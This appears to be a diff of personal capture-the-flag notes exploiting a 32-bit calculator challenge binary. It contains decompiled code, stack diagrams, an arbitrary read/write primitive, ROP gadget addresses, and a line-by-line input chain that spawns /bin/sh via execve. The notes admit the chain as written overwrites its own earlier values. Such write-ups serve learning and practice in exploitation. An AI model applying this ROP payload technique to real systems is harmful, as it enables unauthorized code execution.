@@ -66,52 +66,6 @@ init_pool(undefined4 *param_1) {
    return;
 }
 
-
-          High
-main     ┌─────────────────┐ 
-         ├─────────────────┤
-         |  return addr    | [4 bytes]	    
-         ├─────────────────┤
-calc     |  frame pointer  | [4 bytes] 
-         ├─────────────────┤
-         |  iVar1          | [4 bytes]
-         ├─────────────────┤
-         |  local_5a4      | [4 bytes]     pointer to auStack_5a0
-         ├─────────────────┤
-         |  auStack_5a0    | [400 bytes]   array of ???
-         ├─────────────────┤
-         |  local_410      | [1024 bytes]  array of input expr
-         ├─────────────────┤
-         |  void *param_1  | [4 bytes]     pointer to local_410
-         ├─────────────────┤
-         |  void *param_2  | [4 bytes]     ref to local_5a4 
-         ├─────────────────┤
-         |  return addr    | [4 bytes]
-         ├─────────────────┤
-parse    |  frame pointer  | [4 bytes]
-expr     ├─────────────────┤
-         |  iVar1          | [4 bytes]
-         ├─────────────────┤
-         |  *__s1          | [4 bytes]     memory holds numeric value
-         ├─────────────────┤
-         |  iVar2          | [4 bytes]
-         ├─────────────────┤
-         |  uVar3          | [4 bytes]     return value
-         ├─────────────────┤
-         |  __n            | [4 bytes]     size of numeric value
-         ├─────────────────┤
-         |  *local_8c      | [4 bytes]
-         ├─────────────────┤
-         |  local_88       | [4 bytes]     local_410/param_1 index
-         ├─────────────────┤
-         |  local_84       | [4 bytes]     local_74 index
-         ├─────────────────┤
-         |  local_74       | [100 bytes]   array of operators
-         ├─────────────────┤
-         └─────────────────┘
-         Low
-
-
 // param_1 = local_410 (holds input expr), param_2 = &local_5a4 (empty)
 parse_expr(void *param_1, int *param_2) {
   int iVar1;
@@ -145,8 +99,8 @@ parse_expr(void *param_1, int *param_2) {
       iVar2 = atoi(__s1);                                  // convert __s1 to integer
       if (0 < iVar2) {                                     // if __s1 is > 0 (store numeric value in local_5a4
         iVar1 = *param_2;                                      // iVar1 is set to local_5a4 pointer
-        *param_2 = iVar1 + 1;                                  // local_5a4 pointer moved up 1
-        param_2[iVar1 + 1] = iVar2;                            // local_5a4[iVar1 + 1] = __s1
+        *param_2 = iVar1 + 1;                                  // local_5a4 value incremented 1
+        param_2[iVar1 + 1] = iVar2;                            // auStack_5a0[iVar1] = __s1
       }
 			                                                     // if local_410[local_88 + 1] != 0 and
 																													 // if local_410[local_88 + 1] converted to int is not a digit.
@@ -179,10 +133,6 @@ parse_expr(void *param_1, int *param_2) {
             local_74[local_84] = *(char *)((int)param_1 + local_88);  // after eval, replace evaluated operator with (current)
           }
           break;
-        default:                                           // ??? Why??? Unless there is operator not in whitelist 
-          eval(param_2,(int)local_74[local_84]);           // after +-, this default block will run
-          local_84 = local_84 + -1;
-          break;
         case 0x2b:
         case 0x2d:                                         // for +-
           eval(param_2, (int)local_74[local_84]);          // eval 
@@ -205,30 +155,138 @@ LAB_0804935f:                                              // return with uVar3,
 
 // param_1 = *local_5a4, param_2 = local_74[local_84]
 eval(int *param_1, char param_2) {
-   if (param_2 == '+') {                                   // ADD
-       param_1[*param_1 + -1] = param_1[*param_1 + -1] + param_1[*param_1];
-   }
-   else if (param_2 < ',') {
-       if (param_2 == '*') {                               // MULTIPLICATION
-           param_1[*param_1 + -1] = param_1[*param_1 + -1] * param_1[*param_1];
-       }
-   }
-   else if (param_2 == '-') {                              // SUBTRACTION
-       param_1[*param_1 + -1] = param_1[*param_1 + -1] - param_1[*param_1];
-   }
-   else if (param_2 == '/') {                              // DIVISION
-       param_1[*param_1 + -1] = param_1[*param_1 + -1] / param_1[*param_1];
-   }
-   *param_1 = *param_1 + -1;
-   return;
+  if (param_2 == '+') {                               // ADD
+    param_1[*param_1 + -1] = param_1[*param_1 + -1] + param_1[*param_1];
+  }
+  if (param_2 == '*') {                               // MULTIPLICATION
+    param_1[*param_1 + -1] = param_1[*param_1 + -1] * param_1[*param_1];
+  }
+  else if (param_2 == '-') {                          // SUBTRACTION
+    param_1[*param_1 + -1] = param_1[*param_1 + -1] - param_1[*param_1];
+  }
+  else if (param_2 == '/') {                          // DIVISION
+    param_1[*param_1 + -1] = param_1[*param_1 + -1] / param_1[*param_1];
+  }
+  *param_1 = *param_1 + -1;
+  return;
 }
-
-
-
 
 ┌─────────┐
 | Exploit |
 └─────────┘
+Exploit primitive
+param_1 may only hold 1 numeric value eval(). If there is only 1 numeric value in auStack_5a0, local_5a4 = 1
+param_1[0] = param_1[0] + param_1[1]; Allows modifcation of local_5a4 value directly.
+
+Arbitrary Read calc()  printf("%d\n", auStack_5a0[local_5a4 + -1]);
+Arbitrary Write eval() +100+10 will write 0xa to auStack_5a0[100]
+A note about arbitrary write exploit is that it will fundamentally write twice. It will write to higher address <4 bytes>
+before overwriting the intended target memory. 
+* As long as overwriting is strictly forward (lower address to higher address) everything is ok!
+
+Also, stack canary problem will be avoided, as a canary would be placed at %ebp-4, while the return address, and 
+rop chain will be at %ebp+4 and higher. Thus the stack canary will not be a problem
 
 Exploit Mitigations: ASLR, Canary, NX, Partial RELRO
 
+          High
+main     ┌─────────────────┐ 
+         ├─────────────────┤
+				 |  ROP CHAIN      |              <-- Overwrite!!!
+         ├─────────────────┤
+         |  return addr    | [4 bytes]	  <-- Overwrite!!!
+         ├─────────────────┤
+calc     |  frame pointer  | [4 bytes] 
+         ├─────────────────┤
+         |  iVar1          | [4 bytes]
+         ├─────────────────┤
+         |  local_410      | [1024 bytes]  array of input expr 
+         ├─────────────────┤
+         |  auStack_5a0    | [400 bytes]   array of numeric values 
+         ├─────────────────┤
+         |  local_5a4      | [4 bytes]     pointer to auStack_5a0   <--- Find offset from here!!!
+         ├─────────────────┤
+         |  void *param_2  | [4 bytes]     ref to local_5a4 
+         ├─────────────────┤
+         |  void *param_1  | [4 bytes]     pointer to local_410 (input)
+         ├─────────────────┤
+         |  return addr    | [4 bytes]     
+         ├─────────────────┤
+parse    |  frame pointer  | [4 bytes]
+expr     ├─────────────────┤
+         |  iVar1          | [4 bytes]
+         ├─────────────────┤
+         |  *__s1          | [4 bytes]     memory holds numeric value
+         ├─────────────────┤
+         |  iVar2          | [4 bytes]
+         ├─────────────────┤
+         |  uVar3          | [4 bytes]     return value
+         ├─────────────────┤
+         |  __n            | [4 bytes]     size of numeric value
+         ├─────────────────┤
+         |  *local_8c      | [4 bytes]
+         ├─────────────────┤
+         |  local_88       | [4 bytes]     local_410/param_1 index
+         ├─────────────────┤
+         |  local_84       | [4 bytes]     local_74 index
+         ├─────────────────┤
+         |  local_74       | [100 bytes]   array of operators
+         ├─────────────────┤
+         └─────────────────┘
+         Low
+
+The difference between calc()'s return address and local_5a4 is 1444 bytes. This means that because *local_5a4 is on 4 byte
+values, 1444/4 = 361 (index 360) would overwrite the return value.
+	Thus to overwrite the return value: +360+<abcd>
+
+ROP Chain:
+The goal of the ROP chain should be to run the following: execve("\bin\sh")
+  1. %eax = 11 (execve syscall id)
+  2. %ebx = "\bin\sh" 2f 62 69 6e 2f 73 68 
+  3. syscall
+  4. Writeable location in binary is .data section - 0x080ec100 (135184640)
+	[24] .data             PROGBITS        080ec060 0a3060 000f20 00  WA  0   0 32
+	[25] .bss              NOBITS          080ecf80 0a3f80 00140c 00  WA  0   0 32
+
+Gadgets
+134595403 | 0x0805c34b | pop eax ; ret
+134513105 | 0x080481d1 | pop ebx ; ret
+134676906 | 0x080701aa | pop edx ; ret
+134676944 | 0x080701d0 | pop edx ; pop ecx ; pop ebx ; ret
+134853389 | 0x0809b30d | mov dword ptr [edx], eax ; ret
+134519329 | 0x08049a21 | int 0x80
+
+Write "/bin/sh"
+pop eax ; ret                              0x6e69622f
+pop edx ; ret                              0x080ec100
+mov dword ptr [edx], eax ; ret             0x080ec100: "/bin"
+
+pop eax ; ret                              0x0068732f
+pop edx ; ret                              0x080ec104
+mov dword ptr [edx], eax ; ret             0x080ec104: "/sh\0"
+
+Setup the system call (args & call)
+pop edx ; pop ecx ; pop ebx ; ret          0, 0, 0x080ec100 
+pop eax ; ret                              11 
+int 0x80
+
+Exploit Input
++360+134595403         Overwrite calc() return address to gadget 1 
++361+1852400175        Write "/bin" to stack
++362+134676906         Write return addr to gadget 2
++363+135184640         Write string addr to stack
++364+134853389         Write return addr to gadget 3
++365+134595403         Write return addr to gadget 4
++366+006845231         Write "/sh\0" to stack
++367+134676906         Write return addr to gadget 5
++368+135184644         Write string addr to stack
++369+134853389         Write return addr to gadget 6
++370+134676944         Write return addr to gadget 7
++371+0                 Write 0 to stack
++372+0                 Write 0 to stack
++373+135184640         Write string addr to stack
++374+134595403         Write return addr to gadget 8
++375+11                Write 11 to stack
++376+134519329         Write return addr to gadget 9
+
+This is the right idea, but what I found is that during debugging each new overwrite modifies the previous value
